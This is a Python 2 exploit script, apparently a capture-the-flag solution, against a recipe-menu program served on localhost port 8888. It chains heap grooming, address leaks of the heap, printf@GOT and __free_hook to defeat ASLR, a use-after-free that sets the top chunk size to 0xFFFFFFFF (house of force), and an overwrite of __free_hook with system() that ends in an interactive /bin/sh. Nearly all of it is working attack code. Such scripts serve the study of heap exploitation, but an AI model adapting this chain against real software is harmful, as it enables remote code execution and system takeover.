#
# Shamelessly copied from LiveOverflow's code
#

import struct
import sys
import subprocess
import socket
import telnetlib
import ctypes
import re

# from the binary
PRITNF_OFFSET = 0x49670
SYSTEM_OFFSET = 0x3ada0
FREE_HOOK_OFFSET = 0x71476 + 0x140b8a - 0x9c

# calculated from the leaked addresses
FREE_HOOK_PTR = 0
LIBC = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.settimeout(0.5)
s.connect(('localhost', 8888))

p32 = lambda x: struct.pack("I", x)

def stou(i):
    return ctypes.c_uint32(i).value

def send(msg):
    s.send(msg + '\n')

def recv_all():
    b = ""
    last_recv = True
    while last_recv:
        try:
            last_recv = s.recv(1024)
        except socket.timeout:
            last_recv = None
        if last_recv:
            b += last_recv
    return b

def fill_heap(nr):
    for i in xrange(0, nr):
        send("g")
        send(hex(0x5))
        send(str(i))

def add_leak(addr, groom=0x200):
    if groom > 0:
        fill_heap(groom)

    send("c")
    send("n")
    send("g")
    send("xxx")

    send("d")
    send("q")

    send("a")
    send("n")
    send("g")
    send("AAAA1111")
    send("e")
    send("q")

    recv_all()
    send("c")
    send("g")
    OVERWRITE = "AAAABBBBCCCC" + p32(addr) + p32(0x00000000)
    send(OVERWRITE)
    send("q")
    recv_all()

def parse_ingredient():
    recv_all()
    send("l")
    resp = recv_all()

    print resp

    li = resp.split("------")
    last = li[-2]

    m = re.search("calories: ([ +-]\d+)", last)
    return stou(int(m.groups()[0]))

if __name__ == "__main__":
    recv_all()
    send("babo")

    send("c")
    send("n")
    send("a")
    send("basil")
    send("0")
    send("p")
    send("d")
    recv_all()
    send("p")
    resp = recv_all()
    print resp
    LEAKED_HEAP_ADDR = int(resp.split("\n")[3].split("-")[0])
    send("q")
    print "LEAKED_HEAP_ADDR: 0x{:08x}".format(LEAKED_HEAP_ADDR)

    raw_input("continue?")

    print "add address 0x{:08x} from printf@GOT to leak.".format(0x804d010)
    add_leak(0x804d010, groom=0x200)
    leaked = parse_ingredient()
    print "printf@GOT: 0x{:08x}".format(leaked)
    LIBC = leaked - PRITNF_OFFSET
    print "libc base address: 0x{:08x}".format(LIBC)

    raw_input("continue?")

    FREE_HOOK_PTR = LIBC + FREE_HOOK_OFFSET
    print "trying to leak free_hook address from 0x{:08x}".format(FREE_HOOK_PTR)
    add_leak(FREE_HOOK_PTR, groom=0x200)
    leaked = parse_ingredient()
    FREE_HOOK = leaked
    print "free_hook address: 0x{:08x}".format(FREE_HOOK)

    fill_heap(0x100)

    raw_input("continue?")

# house of force

    print "create another stale recipe pointer"
    send("c")
    send("n")
    send("d")
    send("q")

    raw_input("continue?")

    print "create a ingredient and remove one"
    send("a")
    send("n")
    send("q")

    raw_input("continue?")

    print "use after free recipe overwriting the wilderness with 0xFFFFFFFF"
    send("c")
    send("g")
    send(p32(0x0) + p32(0x0) + p32(0xFFFFFFFF) + p32(0x0))
    send("q")

    raw_input("continue?")

    # used gdb to calc the offset
    HEAP_WILDERNESS = LEAKED_HEAP_ADDR + 0x4ddc
    print "the heap wilderness: 0x{:08x}".format(HEAP_WILDERNESS)

    raw_input("continue?")

    MAGIC_MALLOC = FREE_HOOK - 4*2 - HEAP_WILDERNESS
    print "magic malloc: 0x{:08x}".format(MAGIC_MALLOC)

    send("g")
    send(hex(MAGIC_MALLOC))
    send("X")

    raw_input("continue?")

    print "free_hook: 0x{:08x}".format(FREE_HOOK)
    print "overwrite free_hook with system() 0x{:08x}".format(LIBC+SYSTEM_OFFSET)
    send("g")
    send("0x9")
    send(p32(LIBC+SYSTEM_OFFSET))

    raw_input("continue?")

    send("g")
    send("0x8")
    send("/bin/sh\0")
    recv_all()
    send("R")

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

